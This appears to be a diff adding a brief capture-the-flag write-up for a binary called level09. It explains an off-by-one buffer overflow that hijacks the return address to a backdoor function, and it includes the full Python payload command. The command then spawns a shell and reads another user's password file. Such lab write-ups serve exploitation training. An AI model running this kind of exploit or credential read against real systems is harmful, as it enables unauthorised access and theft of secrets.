@@ -1,0 +1,22 @@
+decompile ./level09
+
+the program reads 41 bytes ( <= 40) in a buffer of 40 
+This allow us to change the len variable in the struct msg
+which allow us to overflow the stack of the handle_msg thanks to the strncpy
+
+the first fgets should have 40 chars + 1 byte
+this byte will have the value that we  want to the strncpy to write:
+sizeof(struct) = 192 + 8(ebp) +8 (adress that we want in the return adress) = 208
+									    = 0xd0
+
+so first fgets = 40 bytes of padding + "\xd0"
+
+second fgets = 200 bytes of padding + adress of secret_bacdoor()
+the adress doesnt change because despite PIE is set the ASLR on the VM is disable:
+cat /proc/sys/kernel/randomize_va_space 
+0
+
+final command :
+(python -c 'print "a" * 40 + "\xd0"'; python -c 'import struct; print "a" * 200 + struct.pack("<Q", 0x55555555488c)')
+/bin/sh
+cat /home/users/end/.pass
